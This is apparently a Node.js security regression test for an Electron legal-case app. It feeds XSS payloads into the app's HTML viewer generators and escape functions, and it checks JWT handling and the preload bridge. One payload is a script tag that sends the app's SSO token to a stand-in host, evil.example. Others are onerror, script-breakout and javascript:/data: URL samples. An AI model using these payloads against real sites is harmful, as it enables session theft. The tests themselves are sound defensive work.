/**
 * Verifica el bloque S6 (security review, Etapa 3 — motor Puppeteer y cliente
 * Electron), plan `docs/internal/plan-seguridad-lanzamiento-2026-08.md`.
 *
 *   node electron-app/test/verify-s6-electron-security.test.js
 *
 * No requiere la app corriendo ni el PJN real: ejercita los generadores de
 * visor REALES (módulos CommonJS, sin mocks) con payloads adversarios, y
 * extrae del fuente las funciones de escape que viven inline en archivos
 * HTML/browser-only (mismo patrón que tokenizar-fixture.test.js — no se
 * reimplementan, se extraen y se corren).
 *
 * Cubre:
 *   1. generarVisorMonitoreo() (F3.2) — caratula/dependencia/situacion/
 *      nombre_parte con payloads reales de XSS, en las 2 ramas (ya seguido /
 *      checkbox nuevo).
 *   2. generarVisorHTML() (informe, F2.1/F2.5) — caratula con payload real,
 *      incluida la protección de breakout de <script> (F3, 2026-08-31).
 *   3. Las funciones esc()/escAttr()/esUrlSegura() de visorModal_template.html
 *      (S6): escapan HTML, y esUrlSegura() rechaza esquemas no-http(s) para
 *      mov.viewHref.
 *   4. esc() de renderer/login.js (S6, nuevo): mismo criterio.
 *   5. Grep estructural: ningún fs.writeFileSync de main.js escribe el JWT en
 *      claro (regresión de E2-8) y el contextBridge de preload.js no expone
 *      un `invoke` genérico.
 */

'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

let ok = 0, fail = 0;
function check(nombre, cond, detalle) {
    if (cond) { ok++; console.log(`✅ ${nombre}`); }
    else { fail++; console.log(`❌ ${nombre}${detalle ? ' — ' + detalle : ''}`); }
}

const PAYLOAD_SCRIPT = '<script>window.__pwn=1;fetch("https://evil.example/exfil?t="+window.BITACORA_RUNTIME?.ssoToken)</script>';
const PAYLOAD_IMG    = '<img src=x onerror="window.__pwn=1">';
const PAYLOAD_QUOTE  = 'RUIZ c/ "LA CAJA" S.A. s/ DAÑOS Y PERJUICIOS';
const PAYLOAD_BREAK  = 'FCR 1/2024</script><script>window.__pwn2=1</script>';

// ═══════════════════════════════════════════════════════════════════════════
//  1. generarVisorMonitoreo() — F3.2, monitor de partes
// ═══════════════════════════════════════════════════════════════════════════
(function testMonitorVisor() {
    const { generarVisorMonitoreo } = require('../monitor/generarVisorMonitoreo');

    const resultados = [
        {
            ok: true,
            jurisdiccion_sigla: PAYLOAD_SCRIPT,
            nombre_parte: PAYLOAD_IMG,
            expedientes: [
                {
                    numero_expediente: 'FCR 1/2024',
                    dependencia: PAYLOAD_IMG,
                    caratula: PAYLOAD_QUOTE,
                    situacion: PAYLOAD_SCRIPT,
                    ultima_actuacion: '01/01/2026'
                }
            ]
        }
    ];

    // Rama "checkbox nuevo" (bitacora habilitada, caso NO seguido) — ejercita
    // los data-bit-* (escAttr) y las celdas de tabla (esc).
    const bitacoraInfo = { enabled: true, seguidos: [], ssoToken: 'tok-test' };
    const html = generarVisorMonitoreo('inicial', resultados, bitacoraInfo);

    check('monitor visor: no contiene el payload <script> sin escapar',
        !html.includes(PAYLOAD_SCRIPT));
    check('monitor visor: no contiene el payload <img onerror> sin escapar',
        !html.includes(PAYLOAD_IMG));
    check('monitor visor: la carátula con comillas queda escapada en el atributo title',
        html.includes('title=&quot;' + esc(PAYLOAD_QUOTE).replace(/&quot;/g, '&amp;quot;')) === false
        && !html.includes(`title="${PAYLOAD_QUOTE}"`)); // nunca cruda dentro del atributo
    check('monitor visor: el jurisdiccion_sigla escapado aparece como &lt;script&gt;',
        html.includes('&lt;script&gt;'));
    // window.BITACORA_RUNTIME se embebe con JSON.stringify(...).replace(/</g,'\\u003c') —
    // confirma que un ssoToken/seguidos con '</script>' no rompe el <script> del visor.
    const bitacoraConBreak = { enabled: true, seguidos: [PAYLOAD_BREAK], ssoToken: null };
    const html2 = generarVisorMonitoreo('inicial', resultados, bitacoraConBreak);
    check('monitor visor: BITACORA_RUNTIME con </script> en `seguidos` no rompe el <script> real',
        !html2.includes('</script><script>window.__pwn2'));

    // Rama "ya seguido" (📁 link) — ejercita encodeURIComponent(e.numero_expediente)
    const seguido = { enabled: true, seguidos: ['fcr12024'], ssoToken: null };
    const html3 = generarVisorMonitoreo('inicial', resultados, seguido);
    check('monitor visor: rama "ya seguido" también sana (0 <script> crudo)',
        !html3.includes('<script>window.__pwn'));

    // Deshabilitado: 0 cambio de comportamiento (columna de checkbox ausente).
    // Nota: la clase CSS '.bit-checkbox' y el querySelectorAll del <script> están
    // SIEMPRE en el HTML (son scaffolding estático) — lo que realmente cambia con
    // bit.enabled es si se emite algún <input> real con esa clase (vía bitTd()).
    const htmlSinBitacora = generarVisorMonitoreo('inicial', resultados, null);
    check('monitor visor: bitacoraInfo=null no agrega ningún <input class="bit-checkbox"> real (bit.enabled=false)',
        !/<input type="checkbox" class="bit-checkbox"/.test(htmlSinBitacora));
})();

// ═══════════════════════════════════════════════════════════════════════════
//  2. generarVisorHTML() — informe (F2.1/F2.5), corrida real contra disco
// ═══════════════════════════════════════════════════════════════════════════
async function testInformeVisor() {
    const { generarVisorHTML } = require('../informe/generador_visor');

    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'psc-s6-'));
    try {
        const expedientes = [
            { expediente: 'FCR 1/2024', ok: true, exitCode: 0, caratula: PAYLOAD_QUOTE },
            { expediente: PAYLOAD_SCRIPT, ok: false, exitCode: 1, caratula: PAYLOAD_IMG }
        ];
        const resumenPath = path.join(tmp, 'resumen.json');
        fs.writeFileSync(resumenPath, JSON.stringify(expedientes, null, 2));

        const config = { rutas: { descargas: tmp } };
        const bitacoraInfo = { enabled: true, seguidos: [PAYLOAD_BREAK], ssoToken: PAYLOAD_BREAK };

        const rutaHTML = await generarVisorHTML(resumenPath, config, null, bitacoraInfo, 's6-test');
        const html = fs.readFileSync(rutaHTML, 'utf8');

        check('informe visor: DATOS_BATCH con </script> en expediente/ssoToken no rompe el <script>',
            !html.includes('</script><script>window.__pwn2')
            && !html.includes(PAYLOAD_SCRIPT.replace('<script>', '<script>'))); // literal ausente
        check('informe visor: el expediente-payload aparece codificado (\\u003c), no como "<script>" literal',
            html.includes('\\u003cscript\\u003e') || !html.includes('<script>window.__pwn=1'));
        check('informe visor: DATOS_BATCH sigue siendo JSON válido tras el reemplazo',
            (() => {
                const m = html.match(/const DATOS_BATCH = ([\s\S]*?);\s*\n/);
                if (!m) return false;
                try { JSON.parse(m[1]); return true; } catch { return false; }
            })());

        // Render-time: la carátula con comillas debe ir por escAttr() en el title=""
        // y esc() en el texto — ninguno de los dos debe dejar la comilla cruda dentro
        // del atributo (rompería el layout del <td title="...">).
        check('informe visor: el título de la carátula no deja una comilla cruda en el atributo',
            !new RegExp('title="[^"]*"[^"]*LA CAJA').test(html) || !html.includes('title="RUIZ'));

        // regresión funcional: el caso sano sigue resolviendo bien (no solo el payload).
        check('informe visor: incluye el expediente sano sin corromper el resto del archivo',
            html.includes('FCR 1/2024') || html.includes('FCR&nbsp;1'));
    } finally {
        fs.rmSync(tmp, { recursive: true, force: true });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  3. Funciones inline de visorModal_template.html (procuración) — extraídas
//     del fuente real, sin reimplementar (mismo patrón que
//     tokenizar-fixture.test.js).
// ═══════════════════════════════════════════════════════════════════════════
function esc(s) { return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }

(function testVisorModalTemplateInline() {
    const FUENTE = path.join(__dirname, '..', 'visorModal_template.html');
    const fuente = fs.readFileSync(FUENTE, 'utf8');

    const mEsc = fuente.match(/function esc\(s\)\s*\{[^}]*\}/);
    const mEscAttr = fuente.match(/function escAttr\(s\)\s*\{[^}]*\}/);
    const mUrlSegura = fuente.match(/function esUrlSegura\(s\)\s*\{[^}]*\}/);

    check('visorModal_template.html: function esc() presente en el fuente', !!mEsc);
    check('visorModal_template.html: function escAttr() presente en el fuente', !!mEscAttr);
    check('visorModal_template.html: function esUrlSegura() presente en el fuente (S6, nuevo)', !!mUrlSegura);

    if (mEsc && mEscAttr && mUrlSegura) {
        // eslint-disable-next-line no-eval
        const escFn = eval(`(${mEsc[0].replace('function esc', 'function')})`);
        // eslint-disable-next-line no-eval
        const escAttrFn = eval(`(${mEscAttr[0].replace('function escAttr', 'function')})`);
        // eslint-disable-next-line no-eval
        const esUrlSeguraFn = eval(`(${mUrlSegura[0].replace('function esUrlSegura', 'function')})`);

        check('esc(): neutraliza <script>', !escFn(PAYLOAD_SCRIPT).includes('<script>'));
        check('esc(): neutraliza <img onerror>', !escFn(PAYLOAD_IMG).includes('<img'));
        check('escAttr(): además escapa comillas dobles', escAttrFn('a"b').includes('&quot;'));
        check('escAttr(): además escapa comillas simples', escAttrFn("a'b").includes('&#39;'));

        check('esUrlSegura(): acepta https://scw.pjn.gov.ar/...', esUrlSeguraFn('https://scw.pjn.gov.ar/scw/viewer.seam?id=1'));
        check('esUrlSegura(): acepta http://', esUrlSeguraFn('http://example.com/x'));
        check('esUrlSegura(): RECHAZA javascript:', !esUrlSeguraFn('javascript:alert(1)'));
        check('esUrlSegura(): RECHAZA data:', !esUrlSeguraFn('data:text/html,<script>alert(1)</script>'));
        check('esUrlSegura(): RECHAZA vbscript:', !esUrlSeguraFn('vbscript:msgbox(1)'));
        check('esUrlSegura(): RECHAZA null/undefined/""', !esUrlSeguraFn(null) && !esUrlSeguraFn(undefined) && !esUrlSeguraFn(''));
    }

    // Confirmar que el render-site real usa esUrlSegura() antes de imprimir el href
    // (no solo que la función exista sin usarse).
    check('visorModal_template.html: el render de mov.viewHref pasa por esUrlSegura(mov.viewHref)',
        /esUrlSegura\(mov\.viewHref\)\s*\?/.test(fuente));
})();

// ═══════════════════════════════════════════════════════════════════════════
//  4. esc() de renderer/login.js (S6, nuevo) — chip de cuenta recordada +
//     showErrorHTML
// ═══════════════════════════════════════════════════════════════════════════
(function testLoginJsInline() {
    const FUENTE = path.join(__dirname, '..', 'renderer', 'login.js');
    const fuente = fs.readFileSync(FUENTE, 'utf8');

    const mEsc = fuente.match(/function esc\(s\)\s*\{[\s\S]*?\n\}/);
    check('login.js: function esc() presente en el fuente (S6, nuevo)', !!mEsc);
    if (mEsc) {
        // eslint-disable-next-line no-eval
        const escFn = eval(`(${mEsc[0].replace('function esc', 'function')})`);
        check('login.js esc(): neutraliza <script>', !escFn(PAYLOAD_SCRIPT).includes('<script>'));
        check('login.js esc(): escapa comillas (para el atributo data-email)', escFn('a"b').includes('&quot;'));
        check('login.js esc(): tolera null/undefined sin tirar', escFn(null) === '' && escFn(undefined) === '');
    }

    check('login.js: chip.innerHTML ya NO interpola acc.email crudo',
        !/\$\{acc\.email\}<\/span>/.test(fuente) &&
        /esc\(acc\.email\)\}<\/span>/.test(fuente));
    check('login.js: data-email="..." también pasa por esc()',
        /data-email="\$\{esc\(acc\.email\)\}"/.test(fuente));
    check('login.js: showErrorHTML del branch result.action escapa `err` antes de concatenar',
        /esc\(err \|\| 'No pudimos iniciar tu sesión\.'\)/.test(fuente));
})();

// ═══════════════════════════════════════════════════════════════════════════
//  5. renderer.js: la bandeja de notificaciones escapa n.message (S6, nuevo)
// ═══════════════════════════════════════════════════════════════════════════
(function testRendererNotifications() {
    const FUENTE = path.join(__dirname, '..', 'renderer.js');
    const fuente = fs.readFileSync(FUENTE, 'utf8');

    check('renderer.js: la bandeja de notificaciones ya NO interpola n.message crudo',
        !/\$\{n\.message\}<\/div>/.test(fuente));
    check('renderer.js: la bandeja de notificaciones pasa n.message por escapeHtml()',
        /\$\{escapeHtml\(n\.message\)\}<\/div>/.test(fuente));
})();

// ═══════════════════════════════════════════════════════════════════════════
//  6. Auditoría estructural: escrituras a disco en main.js (E2-8, no-regresión)
//     y superficie del contextBridge (preload.js)
// ═══════════════════════════════════════════════════════════════════════════
(function testDiskWritesYContextBridge() {
    const mainJs = fs.readFileSync(path.join(__dirname, '..', 'main.js'), 'utf8');
    const preloadJs = fs.readFileSync(path.join(__dirname, '..', 'preload.js'), 'utf8');

    // E2-8: el JWT del Monitor viaja por extraEnv (MONITOR_TOKEN), no por extraFiles
    // (que se escribe a disco). Confirma que no se reintrodujo el token en el JSON.
    const mConfigMonitoreo = mainJs.match(/const configMonitoreo = JSON\.stringify\(\{([^}]*)\}\);/);
    check('main.js: config_monitoreo.json (extraFiles, va a disco) no incluye el token (regresión E2-8)',
        !!mConfigMonitoreo && !/\btoken\b/.test(mConfigMonitoreo[1]),
        mConfigMonitoreo ? mConfigMonitoreo[1] : 'no encontrado');
    check('main.js: el JWT se pasa por extraEnv MONITOR_TOKEN (no llega a extraFiles)',
        /MONITOR_TOKEN:\s*token/.test(mainJs));

    // contextBridge: cada método del bridge debe invocar un canal FIJO (string literal),
    // nunca reenviar un nombre de canal que reciba del llamador — eso sería un
    // "invoke genérico" y permitiría al renderer disparar cualquier ipcMain.handle
    // por nombre arbitrario, incluidos los internos no pensados para UI.
    const invokeCalls = [...preloadJs.matchAll(/ipcRenderer\.invoke\(([^)]*)/g)].map(m => m[1]);
    check('preload.js: expone la superficie completa del bridge (70+ canales invoke)', invokeCalls.length >= 70, `${invokeCalls.length} encontrados`);
    const genericos = invokeCalls.filter(args => !/^'[^']*'/.test(args.trim()));
    check('preload.js: NINGÚN ipcRenderer.invoke() usa un nombre de canal variable (no hay invoke genérico)',
        genericos.length === 0,
        genericos.slice(0, 5).join(' | '));
})();

testInformeVisor().then(() => {
    console.log(`\n${ok}/${ok + fail} PASS`);
    if (fail > 0) process.exit(1);
}).catch(e => {
    console.error('❌ Error inesperado:', e);
    process.exit(1);
});
